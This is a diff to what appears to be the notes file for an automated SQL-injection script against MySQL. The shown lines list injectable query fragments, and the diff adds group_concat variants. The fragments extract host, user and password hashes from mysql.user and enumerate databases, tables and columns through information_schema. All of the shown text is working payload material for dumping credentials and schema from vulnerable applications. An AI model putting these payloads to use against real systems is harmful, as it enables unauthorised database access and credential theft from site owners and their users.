@@ -32,6 +32,7 @@ Regular Queries (Single-Result):
 =================================================================
 
 Limit Queries (Multi-Result) -> script automatically increments (only include 'LIMIT'):
+	*Alternative: use group_concat
 =================================================================
 "concat(host, char(58), user, char(58), password) FROM mysql.user LIMIT"
 "schema_name FROM information_schema.schemata LIMIT"
@@ -42,6 +43,7 @@ Limit Queries (Multi-Result) -> script automatically increments (only include 'L
 	
 **Databases, Tables, and Columns: "concat(table_schema, char(58), table_name, char(58), column_name) FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT"
 Databases: "schema_name FROM information_schema.schemata LIMIT"
+	OR:  "group_concat(schema_name) from information_schema.schemata"
 Tables: "table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT" 
 	Or: "TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT" 
 Columns: "column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT"
